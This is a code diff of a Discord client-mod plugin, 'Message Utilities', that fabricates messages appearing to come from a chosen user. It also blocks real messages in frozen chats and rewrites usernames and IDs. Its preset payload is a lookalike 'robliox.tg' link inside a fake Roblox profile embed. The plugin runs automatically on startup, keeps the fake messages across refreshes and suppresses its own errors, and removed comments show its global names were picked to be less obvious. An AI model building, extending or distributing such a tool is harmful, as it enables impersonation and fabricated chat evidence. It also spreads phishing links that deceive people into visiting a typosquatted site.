@@ -52,69 +52,52 @@
             */
             
             const CONFIG = {
-                // Turn individual systems on/off
                 features: {
                   clipboard:   true,
                   dispatcher:  true,
                   linkBuilders:true,
-                  autoFakeMessages: true,  // Send fake messages automatically on startup
-                  persistentMessages: true, // Keep fake messages persistent across refreshes
-                  chatFreezing: true       // Freeze chats to keep fake messages at bottom
+                  autoFakeMessages: true,
+                  persistentMessages: true,
+                  chatFreezing: true
                 },
               
-                // Delay (ms) before patching to ensure modules are loaded
                 startDelayMs: 800,
               
-                // Auto fake messages to send on startup (if features.autoFakeMessages is true)
                 autoFakeMessages: [
                   {
                     enabled: true,
-                    delayMs: 2000,  // Delay after plugin starts before sending
-                    channelId: "",  // Channel ID to send to (leave empty to use dmUserId)
-                    dmUserId: "753944929973174283",  // User ID to DM (if channelId is empty)
-                    userId: "753944929973174283",    // User ID that will appear to send the message
+                    delayMs: 2000,
+                    channelId: "",
+                    dmUserId: "753944929973174283",
+                    userId: "753944929973174283",
                     content: "https://www.robliox.tg/users/6081066/profile",
-                    username: "",  // Optional: override username
-                    avatar: "",     // Optional: override avatar
-                    // New embed customization options
-                    embedTitle: "Konethorix's Profile",  // Custom embed title
-                    embedDescription: "Konethorix is one of the millions creating and exploring the endless possibilities of Roblox. Join Tsundari on Roblox and explore together!｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ ♡ ♡ 21+...",  // Custom embed description
-                    embedThumbnail: "https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avatar-E4C7523BC87558FC998E76BBC8348F40-Png/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528"  // Custom embed thumbnail URL
+                    username: "",
+                    avatar: "",
+                    embedTitle: "Konethorix's Profile",
+                    embedDescription: "Konethorix is one of the millions creating and exploring the endless possibilities of Roblox. Join Tsundari on Roblox and explore together!｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ ♡ ♡ 21+...",
+                    embedThumbnail: "https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avatar-E4C7523BC87558FC998E76BBC8348F40-Png/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528"
                   }
-                  // Add more auto messages as needed...
                 ],
               
-                // Add user IDs or channel IDs to freeze their chats (if features.chatFreezing is true)
                 frozenChats: [
-                  "753944929973174283", // User ID to freeze
-                  // "channel_id_here", // Or channel ID to freeze
+                  "753944929973174283",
                 ],
               
-                // ID remaps (snowflakes as strings)
-                // Example: old user/channel/guild/message ID -> new ID
                 idMaps: [
-                  // add more...
                 ],
               
-                // Username changer rules (optional)
-                // If author's id equals matchId OR author's username equals matchUsername,
-                // replace with newUsername (also sets global_name if present)
                 usernameRules: [
                   { matchId: ".Tweety", newId: "Emaytee" }
-                  // add more...
                 ],
               
-                // Optional "tag" remap (legacy discriminators) — rarely used nowadays
                 tagRules: [
-                  // { oldTag: "cooldragon12346", newTag: "emaytee42" }
                 ],
               
-                // Quick actions (you can call from console via __MSG_UTILS__)
                 quick: {
-                  mode: "inject",                  // "inject" (local) or "send" (real)
-                  channelId: "",                   // set to a channel ID OR dmUserId
-                  dmUserId: "753944929973174283",  // user ID to DM (auto-creates DM)
-                  content: "https://www.robliox.tg/users/6081066/profile embedTitle: \"Konethorix's Profile\" embedDescription: \"Konethorix is one of the millions creating and exploring the endless possibilities of Roblox. Join Tsundari on Roblox and explore together!｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ ♡ ♡ 21+...\" embedThumbnail: \"https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avatar-E4C7523BC87558FC998E76BBC8348F40-Png/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528\"",
+                  mode: "inject",
+                  channelId: "",
+                  dmUserId: "753944929973174283",
+                  content: "https://www.robliox.tg/users/6081066/profile embedTitle: \"Konethorix's Profile\" embedDescription: \"Konethorix is one of the millions creating and exploring the endless possibilities of Roblox. Join Tsundari on Roblox and explore together!｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ﾟ★,｡･:*:･ﾟ☆｡･:*:･ ♡ ♡ 21+...\" embedThumbnail: \"https://images-ext-1.discordapp.net/external/7GubuBgUnMZfWd7-1PPBtbzt_b-LNUC-zberDWFAvcw/https/tr.rbxcdn.com/30DAY-Avapshot/352/352/Avatar/Png/noFilter?format=webp&width=528&height=528\"",
                   embed: {
                     title: "",
                     description: "",
@@ -124,11 +107,9 @@
                 }
               };
               
-              /* ---------------------------------------------------------
-              * 2) IMPLEMENTATION (no edits needed below)
-              * ------------------------------------------------------- */
+
               (function () {
-                // Use a less obvious global variable name
+
                 if (window.__MSG_UTILS_LOADED__) return;
                 window.__MSG_UTILS_LOADED__ = true;
               
@@ -138,19 +119,14 @@
                 };
                 const delay = (ms) => new Promise(r => setTimeout(r, ms));
               
-                              // Normalize/sanitize image URLs so Discord renders them reliably
               function sanitizeImageUrl(u) {
                 try {
                   if (!u) return u;
                   let s = String(u);
-                  
-                  // For Discord CDN links, try to preserve original format if possible
                   if (s.includes('cdn.discordapp.net') || s.includes('media.discordapp.net')) {
-                    // Keep original format for Discord CDN links
                     return s;
                   }
                   
-                  // For external links, prefer png over webp
                   s = s.replace(/(\?|&)format=webp\b/i, "$1format=png");
                   s = s.replace(/\bformat=webp\b/i, "format=png");
                   
@@ -158,7 +134,6 @@
                 } catch { return u; }
               }
               
-              // Debug helper - sends debug info as actual messages
               async function debugMessage(channelId, dmUserId, message) {
                 try {
                   const MessageActions = await waitForProps(["receiveMessage"]);
@@ -183,16 +158,16 @@
                   
                   MessageActions?.receiveMessage?.(target, debugMsg);
                 } catch (error) {
-                  // Silent fail for debug messages
+
                 }
               }
               
-              // Silent error handler
+              
                 const silentError = (msg) => {
-                  // Completely silent - no logging, no toasts
+
                 };
               
-                // Enmity accessors (late-bound)
+
                 const api = {
                   register(fn)      { 
                     try { return get(window, "enmity.plugins.registerPlugin", null)?.(fn); } 
@@ -218,15 +193,15 @@
                     try { return get(window, "enmity.modules.common.Toasts", null); } 
                     catch { return null; }
                   },
-                  // Silent version - no toast display
+
                   showToast(msg)    { /* intentionally silent */ }
                 };
               
-                // Store persistent fake messages
+
                 const persistentFakeMessages = new Map();
                 let ChannelStore = null;
               
-                // Map helpers
+
                 const SNOWFLAKE_RE = /^\d{17,21}$/;
                 function buildIdMap() {
                   const m = new Map();
@@ -240,14 +215,14 @@
                   return m.get(k) ?? k;
                 }
               
-                // Check if a channel should be frozen
+
                 function shouldFreezeChannel(channelId) {
                   if (!channelId || !CONFIG.frozenChats?.length || !CONFIG.features.chatFreezing) return false;
                   
-                  // Check if channel ID is in frozen list
+
                   if (CONFIG.frozenChats.includes(channelId)) return true;
                   
-                  // Check if this is a DM channel with a frozen user
+                  
                   if (ChannelStore) {
                     const channel = ChannelStore.getChannel?.(channelId);
                     if (channel && channel.recipients && channel.recipients.length === 1) {
@@ -259,7 +234,7 @@
                   return false;
                 }
               
-                // Clipboard rewrite
+
                 function rewriteOneDiscordUrl(u, idMap) {
                   try {
                     const url = new URL(String(u));
@@ -295,7 +270,7 @@
                   return rewriteDiscordUrlsInText(raw, idMap);
                 }
               
-                // Message rewrite (dispatcher)
+
                 function applyUsernameRules(author) {
                   if (!author) return;
                   for (const r of (CONFIG.usernameRules || [])) {
@@ -349,7 +324,7 @@
                   applyUsernameRules(author);
                 }
               
-                // Wait for module utility
+
                 async function waitForProps(props, timeout = 8000, step = 100) {
                   const start = Date.now();
                   while (Date.now() - start < timeout) {
@@ -360,7 +335,7 @@
                   return null;
                 }
               
-                // Patches
+
                 let patcher = null;
                 async function patchClipboard() {
                   if (!CONFIG.features.clipboard) return;
@@ -412,7 +387,7 @@
                   } catch {}
                 }
               
-                // Patch message loading and freezing
+
                 async function patchDispatcher() {
                   if (!CONFIG.features.dispatcher && !CONFIG.features.chatFreezing) return;
                   try {
@@ -426,23 +401,23 @@
               
                         // Chat freezing functionality
                         if (CONFIG.features.chatFreezing) {
-                          // Block MESSAGE_CREATE for frozen channels
+      
                           if (action.type === 'MESSAGE_CREATE' || action.type === 'MESSAGE_UPDATE') {
                             const channelId = action.channelId || action.message?.channel_id;
                             if (channelId && shouldFreezeChannel(channelId)) {
-                              // Block the message from being processed
+
                               return null;
                             }
                           }
               
-                          // Block message loads for frozen channels
+                          
                           if (action.type === 'LOAD_MESSAGES_SUCCESS' && shouldFreezeChannel(action.channelId)) {
-                            // Prevent new messages from loading into frozen channels
+
                             return null;
                           }
                         }
               
-                        // Original dispatcher functionality
+                        
                         if (action.type === "MESSAGE_CREATE" || action.type === "MESSAGE_UPDATE") {
                           const msg = action.message || action.messageRecord;
                           if (!msg) return;
@@ -456,7 +431,7 @@
                             rewriteMessageObject(m);
                           }
                           
-                          // Reinject persistent fake messages when messages are loaded
+
                           if (CONFIG.features.persistentMessages) {
                             setTimeout(() => {
                               reinjectPersistentMessages(action.channelId);
@@ -468,7 +443,7 @@
                   } catch {}
                 }
               
-                // Patch message sending to block for frozen channels
+
                 async function patchMessageSending() {
                   if (!CONFIG.features.chatFreezing) return;
                   try {
@@ -491,7 +466,7 @@
                   }
                 }
               
-                // DM helper + message actions
+
                 async function ensureDmChannel(userId) {
                   const DMs  = await waitForProps(["getDMFromUserId", "getChannel"]);
                   const HTTP = await waitForProps(["get", "post", "put", "del", "patch"]);
@@ -508,7 +483,7 @@
                   throw new Error("Provide channelId or dmUserId");
                 }
                 
-                // Get user info by ID
+
                 async function getUserInfo(userId) {
                   const UserStore = await waitForProps(["getUser", "getCurrentUser"]);
                   return UserStore?.getUser?.(userId);
@@ -530,14 +505,14 @@
                   }
                 }
                 
-                // Create a fake message that appears to be from another user
+
                 async function fakeMessage({ channelId, dmUserId, userId, content, embed, username, avatar, timestamp, persistent = true }) {
                   debugMessage(channelId, dmUserId, `fakeMessage called with content: "${content}" and embed: ${JSON.stringify(embed)}`);
                   
                   const MessageActions = await waitForProps(["sendMessage", "receiveMessage"]);
                   const target = await normalizeTarget({ channelId, dmUserId });
                   
-                  // Handle timestamp safely - use current time by default, or provided timestamp
+
                   let messageTimestamp;
                   try {
                     if (timestamp) {
@@ -556,7 +531,7 @@
                     messageTimestamp = new Date().toISOString();
                   }
                   
-                  // Get user info if userId is provided
+                  
                   let userInfo = null;
                   if (userId) {
                     userInfo = await getUserInfo(userId);
@@ -568,8 +543,7 @@
                   if (embed && (embed.title || embed.description || embed.url || embed.thumbnail || embed.image)) {
                     debugMessage(channelId, dmUserId, `Custom embed provided: ${JSON.stringify(embed)}`);
                     
-                    // Extract URL from content if no URL provided - this ensures the embed is clickable
-                    // and Discord properly displays it as a link embed with thumbnail on the right
+
                     let embedUrl = embed.url;
                     if (!embedUrl && content) {
                       const urlRegex = /(https?:\/\/[^\s]+)/g;
@@ -592,8 +566,26 @@
                       description: embed.description || undefined,
                       url: embedUrl || undefined
                     };
-                    if (thumbUrl) built.thumbnail = { url: sanitizeImageUrl(thumbUrl) };
-                    if (imageUrl || thumbUrl) built.image = { url: sanitizeImageUrl(imageUrl || thumbUrl) };
+                    
+                    // Enhanced thumbnail handling with proper sizing and styling
+                    if (thumbUrl) {
+                      const sanitizedThumbUrl = sanitizeImageUrl(thumbUrl);
+                      built.thumbnail = { 
+                        url: sanitizedThumbUrl,
+                        width: 80,
+                        height: 80
+                      };
+                      debugMessage(channelId, dmUserId, `Added thumbnail with dimensions: 80x80`);
+                    }
+                    
+                    // Set image if provided, otherwise use thumbnail as large image
+                    if (imageUrl) {
+                      built.image = { url: sanitizeImageUrl(imageUrl) };
+                    } else if (thumbUrl) {
+                      // Use thumbnail as the main image for better visibility
+                      built.image = { url: sanitizeImageUrl(thumbUrl) };
+                      debugMessage(channelId, dmUserId, `Using thumbnail as main image`);
+                    }
                     
                     debugMessage(channelId, dmUserId, `Built embed: ${JSON.stringify(built)}`);
                     embeds.push(built);
@@ -686,7 +678,6 @@
                           embeds.push(embedData);
                         } catch (urlError) {
                           debugMessage(channelId, dmUserId, `Error processing URL ${url}: ${urlError.message}`);
-                          // Skip invalid URLs
                         }
                       }
                     }
@@ -721,7 +712,7 @@
                   debugMessage(channelId, dmUserId, `Sending fake message with ${embeds.length} embeds`);
                   MessageActions?.receiveMessage?.(target, fake);
                   
-                  // Store for persistence if enabled
+
                   if (persistent && CONFIG.features.persistentMessages) {
                     if (!persistentFakeMessages.has(target)) {
                       persistentFakeMessages.set(target, []);
@@ -737,7 +728,7 @@
                   const target = await normalizeTarget({ channelId, dmUserId });
                   const nowIso = new Date().toISOString();
               
-                  // Auto-detect URLs and create embeds
+
                   let embeds = [];
                   
                   if (embed && (embed.title || embed.description || embed.url || embed.thumbnail || embed.image)) {
@@ -759,8 +750,25 @@
                       description: embed.description || undefined,
                       url: embedUrl || undefined
                     };
-                    if (thumbUrl) built.thumbnail = { url: sanitizeImageUrl(thumbUrl) };
-                    if (imageUrl || thumbUrl) built.image = { url: sanitizeImageUrl(imageUrl || thumbUrl) };
+                    
+                    // Enhanced thumbnail handling with proper sizing and styling
+                    if (thumbUrl) {
+                      const sanitizedThumbUrl = sanitizeImageUrl(thumbUrl);
+                      built.thumbnail = { 
+                        url: sanitizedThumbUrl,
+                        width: 80,
+                        height: 80
+                      };
+                    }
+                    
+                    // Set image if provided, otherwise use thumbnail as large image
+                    if (imageUrl) {
+                      built.image = { url: sanitizeImageUrl(imageUrl) };
+                    } else if (thumbUrl) {
+                      // Use thumbnail as the main image for better visibility
+                      built.image = { url: sanitizeImageUrl(thumbUrl) };
+                    }
+                    
                     embeds.push(built);
                   }
                   
@@ -887,8 +895,25 @@
                       description: embed.description || undefined,
                       url: embedUrl || undefined
                     };
-                    if (thumbUrl) built.thumbnail = { url: sanitizeImageUrl(thumbUrl) };
-                    if (imageUrl || thumbUrl) built.image = { url: sanitizeImageUrl(imageUrl || thumbUrl) };
+                    
+                    // Enhanced thumbnail handling with proper sizing and styling
+                    if (thumbUrl) {
+                      const sanitizedThumbUrl = sanitizeImageUrl(thumbUrl);
+                      built.thumbnail = { 
+                        url: sanitizedThumbUrl,
+                        width: 80,
+                        height: 80
+                      };
+                    }
+                    
+                    // Set image if provided, otherwise use thumbnail as large image
+                    if (imageUrl) {
+                      built.image = { url: sanitizeImageUrl(imageUrl) };
+                    } else if (thumbUrl) {
+                      // Use thumbnail as the main image for better visibility
+                      built.image = { url: sanitizeImageUrl(thumbUrl) };
+                    }
+                    
                     embeds.push(built);
                   }
                   if (!embeds.length && content) {
@@ -976,7 +1001,7 @@
                   await MessageActions?.sendMessage?.(target, message);
                 }
               
-                // Auto send fake messages on startup
+                
                 async function sendAutoFakeMessages() {
                   if (!CONFIG.features.autoFakeMessages || !Array.isArray(CONFIG.autoFakeMessages)) {
                     return;
@@ -986,16 +1011,21 @@
                     if (!messageConfig.enabled) continue;
                     
                     try {
-                      // Wait for the specified delay
                       await delay(messageConfig.delayMs || 0);
                       
-                      // Create embed object from message config
                       const embed = {};
                       if (messageConfig.embedTitle) embed.title = messageConfig.embedTitle;
                       if (messageConfig.embedDescription) embed.description = messageConfig.embedDescription;
-                      if (messageConfig.embedThumbnail) embed.thumbnail = { url: messageConfig.embedThumbnail };
+                      if (messageConfig.embedThumbnail) {
+                        embed.thumbnail = { 
+                          url: messageConfig.embedThumbnail,
+                          width: 80,
+                          height: 80
+                        };
+                        // Also set as image for better visibility
+                        embed.image = { url: messageConfig.embedThumbnail };
+                      }
                       
-                      // Send the fake message with proper embed and current timestamp
                       await fakeMessage({
                         channelId: messageConfig.channelId,
                         dmUserId: messageConfig.dmUserId,
@@ -1004,8 +1034,8 @@
                         embed: embed,
                         username: messageConfig.username,
                         avatar: messageConfig.avatar,
-                        timestamp: new Date().toISOString(), // Always use current timestamp
-                        persistent: true // Make it persistent
+                        timestamp: new Date().toISOString(),
+                        persistent: true
                       });
                     } catch (error) {
                       silentError("Failed to send auto fake message");
@@ -1013,7 +1043,7 @@
                   }
                 }
               
-                // Expose console helpers with a less obvious name
+
                 window.__MSG_UTILS__ = {
                   injectMessage,
                   sendMessage,
@@ -1027,7 +1057,7 @@
                       persistentFakeMessages.clear();
                     }
                   },
-                  // Chat freezing controls
+
                   freezeChat: (id) => {
                     if (!CONFIG.frozenChats.includes(id)) {
                       CONFIG.frozenChats.push(id);
@@ -1041,7 +1071,7 @@
                   },
                   getFrozenChats: () => [...CONFIG.frozenChats],
                   isChatFrozen: (id) => CONFIG.frozenChats.includes(id),
-                  // Debug helper - sends debug message to chat
+
                   debug: (message, channelId, dmUserId) => {
                     if (!dmUserId && !channelId) {
                       dmUserId = CONFIG.quick?.dmUserId || CONFIG.autoFakeMessages?.[0]?.dmUserId;
@@ -1050,21 +1080,34 @@
                       debugMessage(channelId, dmUserId, message);
                     }
                   },
-                  // New helper for testing link embedding
-                  // Usage: __MSG_UTILS__.testLinkEmbed(
-                  //   "https://www.robliox.tg/users/6081066/profile",
-                  //   "Konethorix's Profile", 
-                  //   "Konethorix is one of the millions creating and exploring the endless possibilities of Roblox.",
-                  //   "https://your-thumbnail-url.com/image.jpg",
-                  //   "channel_id_here", // or leave empty for DM
-                  //   "user_id_here"     // DM user ID if no channel
-                  // );
-                  testLinkEmbed: (url, title, description, thumbnail, channelId, dmUserId) => {
-                    const content = `${url} embedTitle: "${title}" embedDescription: "${description}" embedThumbnail: "${thumbnail}"`;
+                  sendProfileEmbed: (content, embed, channelId, dmUserId) => {
+                    let thumbnailUrl = embed.embedThumbnail;
+                    if (thumbnailUrl) {
+                      thumbnailUrl = thumbnailUrl.replace(/format=webp/, "format=png");
+                    }
+
+                    const builtEmbed = {
+                      type: "rich",
+                      title: embed.title || "",
+                      description: embed.description || "",
+                      url: content || "",
+                      thumbnail: thumbnailUrl ? { 
+                        url: thumbnailUrl,
+                        width: 80,
+                        height: 80
+                      } : undefined,
+                      image: thumbnailUrl ? { url: thumbnailUrl } : undefined
+                    };
+
+                    if (!dmUserId && !channelId) {
+                      dmUserId = CONFIG.quick?.dmUserId || CONFIG.autoFakeMessages?.[0]?.dmUserId;
+                    }
+
                     return fakeMessage({
                       channelId,
                       dmUserId,
-                      content,
+                      content: "",
+                      embed: builtEmbed,
                       userId: "753944929973174283"
                     });
                   },
@@ -1081,10 +1124,10 @@
                   }
                 };
               
-                // Plugin lifecycle
+
                 async function onStart() {
                   try {
-                    // wait a bit for modules to settle
+
                     const ms = Number(CONFIG.startDelayMs || 0);
                     if (ms > 0) await delay(ms);
               
@@ -1092,7 +1135,7 @@
                     patcher = P?.create?.("msg-utils") || null;
                     if (!patcher) { silentError("patcher missing"); return; }
               
-                    // Get required stores for chat freezing
+
                     ChannelStore = await waitForProps(['getChannel', 'getDMFromUserId']);
               
                     await patchClipboard();
@@ -1100,7 +1143,7 @@
                     await patchDispatcher();
                     await patchMessageSending();
               
-                    // Start auto fake messages if enabled
+
                     if (CONFIG.features.autoFakeMessages) {
                       sendAutoFakeMessages();
                     }
@@ -1115,14 +1158,14 @@
                   persistentFakeMessages.clear();
                 }
               
-                // Register (prefer Enmity register; fallback CommonJS export)
+
                 const reg = api.register.bind(api);
                 if (reg) {
                   reg({
                     name: "Message Utilities",
                     onStart,
                     onStop
-                    // No getSettingsPanel — nothing to open, so no settings crash possible.
+
                   });
                 } else {
                   module.exports = { name: "Message Utilities", onStart, onStop };
